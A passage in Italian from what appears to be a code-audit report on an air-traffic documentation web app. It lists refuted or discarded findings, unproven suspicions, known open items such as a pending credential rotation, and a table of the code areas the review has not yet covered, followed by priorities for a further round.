| **L12** | **Garanzie, test e documenti** | T-056 (subito: rigenerare l'atteso), T-087, T-073, T-057, T-058, T-079, T-080, T-081, T-082, T-083, T-071, T-075, T-078, T-060, T-086 | T-056 conviene farlo in testa al primo lotto, perché protegge tutti gli altri |
| **L13** | **Piattaforma** | T-059 | Lavoro di settimane (Pomelo 9+, riverifica del set MySQL, CI net10): va aperto ora, la scadenza è il 10 novembre |

---

## 5. Confutati e correzioni di scenario

Nessun finding è stato confutato per intero in fase di verifica. Le parti che seguono sono però **cadute**, e
non vanno ripresentate.

**Parti di scenario smentite**

- **T-002 / T-018: logout da un'altra scheda.** Non dipende dalla memoizzazione del livello. L'HttpContext
  del circuito resta quello di partenza.
- **T-007: il timeout.** Non azzera la frequenza: fa fallire l'intero giro.
- **T-026: l'unione con l'APP.** L'esempio non vale, perché `SezioniComuni.Confrontabili` confronta solo
  Airport e AirportMil.
- **T-050: `9999NDV`.** Dà NonValutabile, non Nil.
- **T-065: `{"t":["a"]}`.** Si legge correttamente; fallisce solo un oggetto annidato.
- **T-073: `DiagnosticaCircuito`.** Senza la guardia non si scriverebbero voci vuote: parte una NRE che viene
  inghiottita. Il test resta comunque senza valore.
- **T-082: la carta bilingue.** È già marcata come storia dall'aggiornamento del 1° settembre.
- **T-034: «nessun consumatore guarda AsOf».** Falso per LivePage, che mostra l'età del feed, e per
  `TransferMatcher`.

**Ipotesi scartate dalle dimensioni dopo verifica**

- **Aggregazione e parent.** `PerAeroporto` con un solo `NuovoPadreDeiFigli`: l'ordine di copertura reale dà
  il nonno corretto.
- **Snapshot e bozze.** La cattura Frozen dell'APP «legge la bozza»: in realtà fotografa la stessa versione
  di lavoro.
- **Traduzione e corpus.**
  - La correzione a mano con testo vuoto la blocca la UI.
  - I documenti con Language null non esistono: la colonna non è nullable.
  - Il lock durante la pubblicazione regge.
  - La deduplica delle impronte in `SaveMachineAsync` regge.
- **Pagine e cancelli.**
  - `VersioniPage` con la doppia rotta `{Acc}` resterebbe stantia, ma nessun link porta alla rotta con ACC.
  - `Guarded` di AdminTrasferimentiPage: nessuna sequenza realistica lo innesca con i tasti `disabled`.
  - La release preview `?as=rel` ha il cancello nel servizio.
  - Il cancello release + nascosto degli elenchi pubblici regge.
- **JS.**
  - La corsa di fetch vAWOS fra due scali non si presenta: il selettore è un form GET a pagina piena.
  - `@ondragover:preventDefault` senza gestore funziona su Blazor 10. Sono invece falsi i commenti in
    `EditorToc.razor` e `wireTocDrop` che dicono il contrario.
- **Concorrenza.**
  - Il lost update di `RoleOverrideCache` richiede due admin nello stesso istante.
  - La cache dei confinanti ha un TTL di 5 minuti.
  - La lettura di `DateTime` in `CachedGlobalTopology` è atomica su x64.
  - La spazzata di `RequestRateLimiter` ha un effetto trascurabile.
  - `ReadingLanguageContext.Rendering` durante il congelamento è solo cosmetico.
  - L'`AsyncLocal` di `InFilaAsync` non ha un percorso concreto.
- **Dati e dominio.**
  - LIKE case-sensitive in `ListVolumesAsync`: il parametro non è usato.
  - Lunghezza delle piste da ATIS: poche sigle.
  - Ciclo AIRAC del caricamento: maxlength 8 nella UI.
  - `ParseRequiredOnline` «sempre vera»: nessuno scrive `UnificationRule`.
  - `DocumentImpact.Aperto = 1970` regge su MariaDB.
- **Sicurezza, non ripresentati.**
  - CSP Report-Only: scelta motivata.
  - Key-ring in chiaro: documentato.
  - Logout via GET: impatto trascurabile.
  - `GITHUB_TOKEN` senza blocco `permissions`: niente `pull_request_target`.
  - Host header riflesso: in produzione `AllowedHosts` lo chiude.
  - `/vsop/api/v1/atc/sessions` come scelta scritta, per la prova dal vivo: ripreso come PLAUSIBILE in T-017
    per il conflitto con §14.

**Sospetti non promossi (senza prova)**

- Azure riceve `textType=html` senza escape di `&` e `<` nella prosa.
- `VloaDerivationService.ToggleAsync` fa lettura-modifica-scrittura senza lock.
- `TranslationLookup` scrive la cache dopo un `ConfigureAwait(false)` dentro il circuito.
- `EfSearchRepository` su una versione la cui release non è ancora effettiva: assorbito in T-042.

**Già noti e non ripresentati**

- R-004 (xunit v3), ancora aperto.
- R-003, a metà.
- A13 in lavori-aperti: la rotazione di password DB e credenziali IVAO esposte il 24-25 agosto è ancora «IN
  CORSO», più la password Neon passata in chat il 9 agosto. Materia operativa, fuori dal codice, ma **va
  chiusa**.

---

## 6. Copertura: che cosa questo giro NON ha visto

Buchi dichiarati, da usare come perimetro di un eventuale terzo giro.

| Dimensione | Non coperto |
|---|---|
| **sec-auth** | Lettura riga per riga dei ~110 metodi di scrittura: si è rimasti alla matrice del 6 settembre per EditingService, Release, Deletion e DocumentAdmin. Non verificati: `IHttpContextAccessor` dentro il circuito dal vivo, `VipiDataProtection`, `SegretiFuoriDalWeb` |
| **sec-input** | `Csv.cs`, `TestoTabellare`, `RisolutoreCelle`, `CostruttoreProposta`. `AuroraSectorfileParser` per l'input (coperto poi da aero). `MetarParser` e client meteo come input. `CoordinateConverterPage`. Se una risposta con payload XSS possa restare nella cache pubblica. Nessuno sfruttamento provato in un browser |
| **sec-infra** | Catena reale degli header Cloudflare → nginx → Passenger. Runtime ASP.NET installato su Plesk (le patch Kestrel dipendono dall'host). Pannello Cloudflare e nginx. MediaValidator. Stato reale dell'anteprima Render (redirect_uri OIDC in http non indagato). AuroraBridge.Cli |
| **content-a** | AccDerivation, AccImport, Agreement* (Expansion, Gaps, ToSections, Suggestions, Viewpoint), AirportDataImport, AirportSectorImporter, AirportSidDerivation, AtzTowerShapeService, CatalogoStazioni, ClausePaste, CoordinationDerivation e i composer, CopList, CoverageFallback, FallbackChain, ForeignAcc/Sector*, FrequencyOrdering, GithubTowerShapeService, GuideSearchCatalog |
| **content-b** | SectionCatalog (letto solo per verificare), SectionPayload/Profile/Keys, i payload Mil*, MinimaCharts, Neighbour*, NewDocumentOptionsService, Outline, RegoleDiPista, TabellaGenerica, TitoliDiCatalogo, Transfer* (TransferMatcher già rivisto il 6 settembre), VipiViewService, Vloa* (provider e derivazione vista), AccVipiTranslator, FrasiVloa, TitoliUfficiali |
| **aero** | Domain/Entities (25 file). EffectiveHierarchy (R-014 non riletto). AirspaceMap e modelli. RegulatedAreasMap, AorService, color scheme, IvaoPolygonJson. ConvertedAreasMap. Routing. SectorfileCache, GitHubSidSourceRelease, i provider Aurora (SID, settori, navaid, facts). Rinvio geometrico MIL fuori da SectorVolume. Il JS del quadro oltre `giaInVigore` |
| **services** | ConsistencyReportService (741 righe) e SectorfileComparison. I descrittori Live (Airport/Approach/AreaLiveStation). In Stats: CoverageResolver, TrafficStory/Timeline, AtisInfo, FlightPhase, StatsCounting e il resto di EfAtcStatsQueries. DevCurrentUserProvider, ProductionIdentityGuard. La UI del bridge Avalonia. Nessuna prova contro le API IVAO reali: T-007 non verifica se la lista subcenter porti già la frequenza |
| **ui-pages** | AdminRoles, AdminTasks, AdminAttachments, AdminAirspace, AccAdmin, Aeroporti, ConfinantiAdmin, CoordinateConverter, Diagnostica, StatsDivision, AtcWorldArchive, Guida, ProfileSwapper, SorgentiAdmin, Struttura (tranne 580-625), MilEditor, Aor3dFull, ScreensIndex, ServicesHome. Gran parte di AdminTrasferimentiPage (3739 righe) e di GlossarioPage |
| **ui-components** | La maggior parte dei ~128 `.razor` di Components/Shared, in particolare AirportSectionsEditor, MilSectionsEditor, UnionPanel, ReleasePanel, DeleteDialog. `vipi-print.css`, `vipi-awos.css`, `vipi-theme.css` oltre le media query. Le prime 190 righe di `vipi-aor3d.js` e tutto `vipi-mva.js`. **Nessuna prova a schermo di T-015 e T-016** |
| **concurrency** | I 27 componenti `OwningComponentBase` e le pagine gesto per gesto (solo campione). EfDocumentUnionRepository ed EfMilitaryDocumentService visti dai chiamanti. Giri d'import concorrenti fra hosted service che scrivono le stesse tabelle (directory, settori e dati aeroporto), e import manuale contro automatico |
| **data** | EfDocumentMaintenance (1039 righe, passate d'avvio). EfEditingRepository oltre lock e versioni. EfAirportRepository, EfStructureEditingRepository, EfHierarchyEditingService, EfSectorProjectionService, EfNeighbourRepository, EfTranslationMemory/EfStatoTraduzione, EfDocumentUnionRepository, EfMediaStore, EfAttachmentLibrary, PostgresSchemaReconciler, Seed. Modello contro snapshot colonna per colonna. **`sql_mode` di produzione ignoto**: decide se T-053 e T-054 sono errore o troncamento silenzioso |
| **quality** | Application, Infrastructure e Ui campionati per pattern, non letti per intero. Divergenza reale fra AirportQuickPanel e AirportListPanel. Corsa in AdminTrasferimentiPage non riprodotta. Estrattore zip di Plesk non verificato. Test che non falliscono ragionati, non provati con mutazioni. Senza test: AwosService e l'endpoint vAWOS (guardia `test`, gate IsEditor, `inforce`), AwosTesto, IvaoMetarClient/VatsimMetarClient, `AirportMemberLoader.ValutaLvp`, VipiDataProtection, TraduciOraService, TranslationFillHostedService, EfAttachmentLibrary, le reti anti-segreti di `prepara-pacchetto.ps1` |
| **docs** | `lavori-aperti.md` (1 MB) e `HANDOFF.md` non verificati voce per voce. rounds.md, carte di luglio-agosto, i 60 fogli di `deploy/atc-ivao`, le guide aurora-bridge e standalone-auth: solo campionati. Colonna Accesso verificata su 8 pagine campione. `docs/history` trattato come storia |
| **sicurezza dal vivo** | Login OIDC vero e `SafeReturn` dal vivo. Messaggi fabbricati dentro il circuito Blazor (scalata). Identità Admin. Origin del WebSocket `/_blazor`. Tetto per IP dietro Cloudflare. T-011 e T-024 non riprovati in produzione, per scelta |
| **base** | Nessun database vero aperto per le migrazioni. Nessuna prova di pubblicazione net10 |

**Per un terzo giro, in ordine di rendimento atteso:**

1. I grandi editor di `Components` (AirportSectionsEditor, MilSectionsEditor, UnionPanel, ReleasePanel),
   letti gesto per gesto per lock e sentinelle: T-004, T-013 e T-024 vengono tutti da lì.
2. `EfDocumentMaintenance` e le passate d'avvio.
3. Un `sql_mode` misurato in produzione: decide la gravità di T-053 e T-054.
4. La verifica dal vivo di T-015, T-016 e T-020.
5. La famiglia Agreement* e Transfer* del motore documenti, finora non letta in questo giro.
